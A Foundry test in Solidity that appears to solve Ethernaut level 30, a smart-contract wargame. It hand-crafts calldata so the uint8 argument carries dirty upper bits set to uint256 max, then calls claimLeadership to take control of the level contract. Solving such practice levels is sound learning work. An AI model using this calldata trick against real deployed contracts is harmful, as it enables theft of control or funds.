// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level30 {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}

contract Level30Test is EthernautTest {
    function testLevel30() public {
        _createLevel("30");

        Level30 level30Instance = Level30(levelInstance["30"]);

        // There is no requirement for the upper bits of uint8 to be clean
        // Lets put uint256 max in the call data!
        bytes4 register = Level30.registerTreasury.selector;
        uint256 max = type(uint256).max;
        bytes memory data = new bytes(36);
        assembly ("memory-safe") {
            mstore(add(data, 32), register)
            mstore(add(data, 36), max)
        }

        // Lets then call the contract
        address(level30Instance).call(data);

        // We can then claim leadership
        level30Instance.claimLeadership();

        require(_submitLevel("30"));
    }
}
